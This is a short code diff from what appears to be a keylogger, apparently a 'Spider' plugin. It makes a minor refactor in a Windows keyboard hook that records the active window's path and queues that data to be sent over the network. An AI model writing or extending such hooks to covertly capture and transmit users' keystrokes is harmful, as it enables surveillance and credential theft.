@@ -424,7 +424,7 @@ LRESULT CALLBACK SpiderPlugin::keyboardHookWindows(int nCode, WPARAM wParam, LPA
 			extractPath(cur);
 			msg.currentWindow.fill(0);
 			std::copy(cur.begin(), cur.end(), msg.currentWindow.data());
-			SpiderPlugin::m_sendToNetwork->push(msg);
+			m_sendToNetwork->push(msg);
 		}
 	}
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
